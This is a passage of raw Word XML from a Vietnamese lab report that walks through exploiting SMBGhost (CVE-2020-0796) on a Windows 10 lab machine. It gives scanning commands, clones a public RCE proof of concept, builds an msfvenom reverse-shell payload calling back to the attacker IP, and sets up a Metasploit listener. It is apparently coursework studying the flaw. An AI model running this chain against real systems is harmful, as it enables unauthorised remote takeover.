        <w:t>Tính khả thi của việc khai thác này rất cao, đặc biệt là trong các môi trường mà sudo được sử dụng phổ biến mà không có các biện pháp bảo mật bổ sung như ASLR (Address Space Layout Randomization) hoặc DEP (Data Execution Prevention).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BA59E5" w14:textId="378E5D05" w:rsidR="00A8252C" w:rsidRPr="00A8252C" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="45" w:name="_Toc185277786"/>
      <w:r w:rsidRPr="004236C1">
        <w:t>CVE-2020-0796 (SMBGhost)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
    </w:p>
    <w:p w14:paraId="26258459" w14:textId="057B7BC1" w:rsidR="00F30F59" w:rsidRDefault="004236C1" w:rsidP="002403AD">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="46" w:name="_Toc185277787"/>
      <w:r>
        <w:rPr>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Mô hình</w:t>
      </w:r>
      <w:bookmarkEnd w:id="46"/>
    </w:p>
    <w:p w14:paraId="359AE261" w14:textId="3BBD0DEE" w:rsidR="00A8252C" w:rsidRDefault="004236C1" w:rsidP="00A8252C">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="5ECC37E7" wp14:editId="5B898DF4">
            <wp:extent cx="5271135" cy="2266950"/>
            <wp:effectExtent l="9525" t="9525" r="15240" b="9525"/>
            <wp:docPr id="27928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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5271135" cy="2266950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D727A71" w14:textId="7203A11A" w:rsidR="00A8252C" w:rsidRDefault="00A8252C" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="47" w:name="_Toc184042065"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004236C1" w:rsidRPr="004236C1">
        <w:t>Mô hình thực nghiệm CVE-2020-0796</w:t>
      </w:r>
      <w:bookmarkEnd w:id="47"/>
    </w:p>
    <w:p w14:paraId="746A3FF8" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Thông số:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B24FA44" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Attacker: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A1CF34" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>OS: Kali Linux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E96E931" w14:textId="7CA0A5A8" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>4 Cores - 2 GB RAM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7CB479" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>IP address: 192.168.10.54</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21245E3A" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Target:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3F8980" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>OS: Windows 10 Version 1909 (OS build 19045)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8AB058" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>2 Cores - 2 GB RAM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269BE654" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>IP address: 192.168.10.87</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71231498" w14:textId="47F4FA26" w:rsidR="007909DD" w:rsidRDefault="003D618C" w:rsidP="003D618C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="48" w:name="_Toc185277788"/>
      <w:r>
        <w:t>Kịch bản</w:t>
      </w:r>
      <w:bookmarkEnd w:id="48"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476F1C5D" w14:textId="6E81709F" w:rsidR="00866688" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r w:rsidRPr="004236C1">
        <w:t>Sau khi Attacker đã xâm nhập được vào vùng mạng nội bộ, Attacker tiến hành dò quét các VM trong dải và xác định thông tin của VM dò quét được. Attacker thực hiện kiểm tra và tấn công Target bằng lỗ hổng SMBGhost</w:t>
      </w:r>
      <w:r w:rsidR="004837E3" w:rsidRPr="004837E3">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DC0EAC" w14:textId="60D33C70" w:rsidR="001F6400" w:rsidRDefault="003E54C8" w:rsidP="004507C4">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="49" w:name="_Toc185277789"/>
      <w:r>
        <w:t>Tiến hành thực nghiệm</w:t>
      </w:r>
      <w:bookmarkEnd w:id="49"/>
    </w:p>
    <w:p w14:paraId="7B488FEA" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Bước 1: Dò quét</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C5F4B4" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Attacker dò quét các VM trong vùng mạng nội bộ bằng câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A495810"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arp-scan -lv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A5D51D" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="4384FB32" wp14:editId="5FA57F22">
            <wp:extent cx="5271770" cy="1621790"/>
            <wp:effectExtent l="9525" t="9525" r="14605" b="260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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5271770" cy="1621790"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC419E7" w14:textId="69801BFE" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="50" w:name="_Toc184042066"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003E54C8">
        <w:t>Dò quét các VM trong vùng mạng nội bộ</w:t>
      </w:r>
      <w:bookmarkEnd w:id="50"/>
    </w:p>
    <w:p w14:paraId="7CC9695C" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Phát hiện 1 số VM với địa chỉ IP và địa chỉ MAC trong vùng mạng nội bộ. Tiến hành dò quét thông tin OS của các VM bằng câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55DBF18C"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nmap -O 192.168.10.87</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093145CF" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="445E6E9D" wp14:editId="75C65A3E">
            <wp:extent cx="5257800" cy="2531745"/>
            <wp:effectExtent l="9525" t="9525" r="9525" b="1143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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5257800" cy="2531745"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CEE9FB" w14:textId="4F1F5D09" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="51" w:name="_Toc184042067"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003E54C8">
        <w:t>Dò quét thông tin OS các VM</w:t>
      </w:r>
      <w:bookmarkEnd w:id="51"/>
    </w:p>
    <w:p w14:paraId="60F2F090" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Bước 2: Xác định khả năng khai thác</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6303AEDC" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Phát hiện VM có địa chỉ ip 192.168.10.87 chạy OS Windows 10 có service SMB port 445. Tiến hành tải chương trình kiểm tra khả năng khai thác máy chủ mục tiêu thông qua lỗ hổng SMBGhost bằng câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F581301"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git clone https://github.com/ButrintKomoni/cve-2020-0796.git</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A15624" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="6474E58F" wp14:editId="73979290">
            <wp:extent cx="5267325" cy="1428750"/>
            <wp:effectExtent l="9525" t="9525" r="19050" b="9525"/>
            <wp:docPr id="1316564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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5267325" cy="1428750"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DDC21E" w14:textId="3AE53278" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="52" w:name="_Toc184042068"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003E54C8">
        <w:t>Chương trình kiểm tra lỗ hổng SMBGhost</w:t>
      </w:r>
      <w:bookmarkEnd w:id="52"/>
    </w:p>
    <w:p w14:paraId="3165B8D3" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Chương trình cve-2020-0796-scanner.py thực hiện gửi một gói tin chứa payload đến địa chỉ ipv4 và port 445 của máy chủ mục tiêu để kiểm tra khả năng khai thác lỗ hổng SMBGhost.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26704B40"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python3 cve-2020-0796-scanner.py 192.168.10.87</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56896118" w14:textId="6D621F29" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="3256300F" wp14:editId="2F7E72F6">
            <wp:extent cx="5204460" cy="676275"/>
            <wp:effectExtent l="9525" t="9525" r="24765" b="190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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5204460" cy="676275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D038C80" w14:textId="6A79ED86" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="53" w:name="_Toc184042069"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003E54C8">
        <w:t>Kiểm tra khả năng khai thác lỗ hổng SMBGhost trên Target</w:t>
      </w:r>
      <w:bookmarkEnd w:id="53"/>
    </w:p>
    <w:p w14:paraId="2E3D4FDE" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Bước 3: Tiến hành khai thác</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012DD3BD" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Nhận thấy máy chủ mục tiêu có thể khai thác thông qua lỗ hổng SMBGhost. Tiến hành tải công cụ khai thác CVE-2020-0796 bằng câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5620B634"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git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E964132" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="47CD3736" wp14:editId="26CBDF1F">
            <wp:extent cx="5236210" cy="1968500"/>
            <wp:effectExtent l="9525" t="9525" r="12065" b="22225"/>
            <wp:docPr id="231435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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5236210" cy="1968500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFAB9BD" w14:textId="332E93BE" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="54" w:name="_Toc184042070"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003E54C8">
        <w:t>Chương trình khai thác lỗ hổng SMBGhost</w:t>
      </w:r>
      <w:bookmarkEnd w:id="54"/>
    </w:p>
    <w:p w14:paraId="74B6AA07" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Sử dụng msfvenom - công cụ trong Metasploit Framework (MSF), tạo một payload khai thác trên nền tảng Windows 64-bit có chức năng mở một reverse shell kết nối tới máy Attacker bằng câu lệnh sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA5D232"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msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.10.54 LPORT=4444 -f py -o payload.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7D812F" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Dán đoạn payload vừa tạo vào chương trình khai thác chính exploit.py.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F69ED0E" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="6A21A580" wp14:editId="27D70CF9">
            <wp:extent cx="4783455" cy="6275070"/>
            <wp:effectExtent l="9525" t="9525" r="26670" b="20955"/>
            <wp:docPr id="1311508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35"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4783455" cy="6275070"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD1CAAF" w14:textId="4793F651" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="55" w:name="_Toc184042071"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003E54C8">
        <w:t>Payload khai thác trên Windows 64-bit</w:t>
      </w:r>
      <w:bookmarkEnd w:id="55"/>
    </w:p>
    <w:p w14:paraId="2F73F4CF" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
        <w:spacing w:line="348" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Sử dụng msfconsole - phiên bản dòng lệnh của Metasploit Framework (MSF), thiết lập một listener nhận kết nối từ payload reverse shell đã triển khai trên mục tiêu bằng câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E837CE6"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msf6 &gt; use exploit/multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655B32E8"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msf6 &gt; set payload windows/x64/shell_reverse_tcp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76BCE6B0"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msf6 &gt; set LHOST 192.168.10.54</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47EAEA2B"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lastRenderedPageBreak/>
        <w:t>msf6 &gt; set LPORT 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2653C2"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msf6 &gt; exploit -j</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B607C06" w14:textId="77777777" w:rsidR="003E54C8" w:rsidRDefault="003E54C8" w:rsidP="003E54C8">
      <w:pPr>
